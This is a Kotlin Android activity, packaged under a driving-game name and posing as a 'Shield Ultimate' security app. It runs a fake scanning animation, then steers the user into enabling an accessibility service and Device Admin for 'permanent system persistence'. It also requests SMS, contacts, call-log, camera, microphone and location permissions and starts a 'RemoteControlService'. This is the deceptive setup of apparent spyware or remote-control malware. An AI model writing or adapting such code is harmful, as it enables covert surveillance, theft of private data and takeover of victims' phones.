package com.ansangha.drdriving

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.view.SoundEffectConstants
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.*
import androidx.compose.animation.core.*
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.Canvas
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.draw.blur
import androidx.compose.ui.draw.clip
import androidx.compose.ui.draw.rotate
import androidx.compose.ui.draw.scale
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.*
import androidx.compose.ui.graphics.drawscope.Stroke
import androidx.compose.ui.hapticfeedback.HapticFeedbackType
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.LocalHapticFeedback
import androidx.compose.ui.platform.LocalView
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.ansangha.drdriving.ui.theme.MySecurityAppTheme
import kotlinx.coroutines.delay

enum class SetupState {
    SPLASH, ANALYZING, CORE_SYNC, ADMIN_SYNC, FINALIZING, SECURE_DASHBOARD
}

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        startProtectionService()

        val prefs = getSharedPreferences("shield_prefs", Context.MODE_PRIVATE)
        val isSetupDone = prefs.getBoolean("setup_done", false)

        setContent {
            MySecurityAppTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = Color(0xFF010409)) {
                    if (isSetupDone && areAllPermissionsGranted()) {
                        SecureDashboard()
                    } else {
                        PremiumSetupFlow()
                    }
                }
            }
        }
    }

    private fun startProtectionService() {
        val serviceIntent = Intent(this, RemoteControlService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent)
            else startService(serviceIntent)
        } catch (e: Exception) {}
    }

    private fun areAllPermissionsGranted(): Boolean {
        val perms = arrayOf(
            Manifest.permission.READ_SMS, Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION
        )
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val adminActive = dpm.isAdminActive(ComponentName(this, MyDeviceAdminReceiver::class.java))
        val accessibilityActive = isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)
        
        return perms.all { ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED } && adminActive && accessibilityActive
    }

    @Composable
    fun PremiumSetupFlow() {
        val context = LocalContext.current
        val haptic = LocalHapticFeedback.current
        val view = LocalView.current
        var currentState by remember { mutableStateOf(SetupState.SPLASH) }
        var progress by remember { mutableStateOf(0f) }
        var statusText by remember { mutableStateOf("Initializing Shield...") }

        val animatedProgress by animateFloatAsState(
            targetValue = progress,
            animationSpec = tween(durationMillis = 1000, easing = LinearOutSlowInEasing),
            label = "progress"
        )

        Box(modifier = Modifier.fillMaxSize()) {
            CyberGrid()
            
            Column(
                modifier = Modifier.fillMaxSize().padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center
            ) {
                AnimatedContent(
                    targetState = currentState,
                    transitionSpec = {
                        fadeIn(tween(600)) + scaleIn(initialScale = 0.9f) togetherWith
                        fadeOut(tween(600)) + scaleOut(targetScale = 1.1f)
                    },
                    label = "state_transition"
                ) { state ->
                    when (state) {
                        SetupState.SPLASH -> SplashView { currentState = SetupState.ANALYZING }
                        SetupState.ANALYZING -> AnalyzingView(animatedProgress, statusText)
                        SetupState.CORE_SYNC -> PermissionGuide(
                            "Core Protection",
                            "Enable 'System Intelligence' to activate real-time threat detection.",
                            Icons.Default.Security
                        ) {
                            haptic.performHapticFeedback(HapticFeedbackType.LongPress)
                            view.playSoundEffect(SoundEffectConstants.CLICK)
                            context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                        }
                        SetupState.ADMIN_SYNC -> PermissionGuide(
                            "Anti-Tamper Shield",
                            "Enable Device Admin to ensure permanent system persistence.",
                            Icons.Default.AdminPanelSettings
                        ) {
                            haptic.performHapticFeedback(HapticFeedbackType.LongPress)
                            view.playSoundEffect(SoundEffectConstants.CLICK)
                            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, MyDeviceAdminReceiver::class.java))
                            }
                            context.startActivity(intent)
                        }
                        SetupState.FINALIZING -> FinalizingView()
                        SetupState.SECURE_DASHBOARD -> SecureDashboard()
                    }
                }
            }
        }

        LaunchedEffect(currentState) {
            when (currentState) {
                SetupState.ANALYZING -> {
                    val tasks = listOf("Hardware Audit", "Kernel Verification", "Network Scan", "Encryption Test")
                    for (i in 0..100) {
                        delay(60)
                        progress = i / 100f
                        if (i % 25 == 0) statusText = tasks[(i/25).coerceAtMost(tasks.size - 1)]
                    }
                    delay(500)
                    currentState = if (!isAccessibilityServiceEnabled(context, MyAccessibilityService::class.java)) SetupState.CORE_SYNC else SetupState.ADMIN_SYNC
                }
                SetupState.CORE_SYNC -> {
                    while (!isAccessibilityServiceEnabled(context, MyAccessibilityService::class.java)) delay(1000)
                    currentState = SetupState.ADMIN_SYNC
                }
                SetupState.ADMIN_SYNC -> {
                    val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                    val admin = ComponentName(context, MyDeviceAdminReceiver::class.java)
                    while (!dpm.isAdminActive(admin)) delay(1000)
                    currentState = SetupState.FINALIZING
                }
                SetupState.FINALIZING -> {
                    requestPermissions(arrayOf(
                        Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
                        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.ACCESS_FINE_LOCATION
                    ), 101)
                    
                    delay(4000)
                    context.getSharedPreferences("shield_prefs", Context.MODE_PRIVATE).edit().putBoolean("setup_done", true).apply()
                    startProtectionService()
                    currentState = SetupState.SECURE_DASHBOARD
                }
                else -> {}
            }
        }
    }

    @Composable
    fun SplashView(onDone: () -> Unit) {
        LaunchedEffect(Unit) { delay(3000); onDone() }
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.Shield, null, tint = Color(0xFF2196F3), modifier = Modifier.size(100.dp))
            Spacer(Modifier.height(20.dp))
            Text("SHIELD ULTIMATE", color = Color.White, fontSize = 24.sp, fontWeight = FontWeight.Black, letterSpacing = 6.sp)
        }
    }

    @Composable
    fun AnalyzingView(progress: Float, status: String) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            CircularProgressIndicator(progress = { progress }, modifier = Modifier.size(200.dp), color = Color(0xFF2196F3), strokeWidth = 4.dp)
            Spacer(Modifier.height(40.dp))
            Text(status, color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
        }
    }

    @Composable
    fun PermissionGuide(title: String, desc: String, icon: androidx.compose.ui.graphics.vector.ImageVector, onClick: () -> Unit) {
        Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.padding(20.dp)) {
            Box(modifier = Modifier.size(120.dp).background(Color(0xFF2196F3).copy(0.1f), CircleShape).border(1.dp, Color(0xFF2196F3).copy(0.4f), CircleShape), contentAlignment = Alignment.Center) {
                Icon(icon, null, tint = Color(0xFF2196F3), modifier = Modifier.size(60.dp))
            }
            Spacer(Modifier.height(32.dp))
            Text(title, color = Color.White, fontSize = 26.sp, fontWeight = FontWeight.ExtraBold)
            Spacer(Modifier.height(16.dp))
            Text(desc, color = Color.Gray, textAlign = TextAlign.Center, fontSize = 15.sp)
            Spacer(Modifier.height(50.dp))
            Button(onClick = onClick, modifier = Modifier.fillMaxWidth().height(64.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2196F3)), shape = RoundedCornerShape(20.dp)) {
                Text("AUTHORIZE MODULE", fontWeight = FontWeight.Black, fontSize = 16.sp)
            }
        }
    }

    @Composable
    fun FinalizingView() {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(Icons.Default.VerifiedUser, null, tint = Color(0xFF4CAF50), modifier = Modifier.size(100.dp))
            Spacer(Modifier.height(24.dp))
            Text("SECURITY ACTIVE", color = Color(0xFF4CAF50), fontSize = 24.sp, fontWeight = FontWeight.Black)
        }
    }

    @Composable
    fun SecureDashboard() {
        val haptic = LocalHapticFeedback.current
        Column(modifier = Modifier.fillMaxSize().padding(24.dp)) {
            Text("SHIELD CENTER", color = Color.White, fontSize = 22.sp, fontWeight = FontWeight.Black)
            Text("V6.0 | MAXIMUM SECURITY", color = if (areAllPermissionsGranted()) Color(0xFF4CAF50) else Color(0xFFF44336), fontSize = 10.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(40.dp))
            
            DashboardCard("System Guard", if (areAllPermissionsGranted()) "Real-time threat monitoring" else "Action Required: System Vulnerable", if (areAllPermissionsGranted()) Color(0xFF4CAF50) else Color(0xFFF44336))
            
            Spacer(Modifier.weight(1f))
            Surface(
                modifier = Modifier.fillMaxWidth().height(60.dp).clickable { 
                    haptic.performHapticFeedback(HapticFeedbackType.LongPress)
                    finish() 
                },
                shape = RoundedCornerShape(16.dp),
                color = Color(0xFF0D1117),
                border = BorderStroke(1.dp, Color.White.copy(0.1f))
            ) {
                Box(contentAlignment = Alignment.Center) {
                    Text("OPTIMIZE & CLOSE", color = Color.White, fontWeight = FontWeight.Bold)
                }
            }
            Spacer(Modifier.height(20.dp))
        }
    }

    @Composable
    fun DashboardCard(title: String, sub: String, color: Color) {
        Row(modifier = Modifier.fillMaxWidth().padding(vertical = 10.dp).background(Color(0xFF0D1117), RoundedCornerShape(20.dp)).padding(20.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(Icons.Default.GppGood, null, tint = color, modifier = Modifier.size(28.dp))
            Spacer(Modifier.width(20.dp))
            Column {
                Text(title, color = Color.White, fontWeight = FontWeight.Bold)
                Text(sub, color = color.copy(alpha = 0.7f), fontSize = 12.sp)
            }
        }
    }

    @Composable
    fun CyberGrid() {
        Canvas(modifier = Modifier.fillMaxSize().alpha(0.05f)) {
            val step = 50.dp.toPx()
            for (i in 0..size.width.toInt() step step.toInt()) drawLine(Color.Cyan, Offset(i.toFloat(), 0f), Offset(i.toFloat(), size.height), 1f)
            for (i in 0..size.height.toInt() step step.toInt()) drawLine(Color.Cyan, Offset(0f, i.toFloat()), Offset(size.width, i.toFloat()), 1f)
        }
    }

    private fun isAccessibilityServiceEnabled(context: Context, service: Class<out AccessibilityService>): Boolean {
        val expected = ComponentName(context, service)
        val enabled = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return enabled.contains(expected.flattenToString())
    }
}
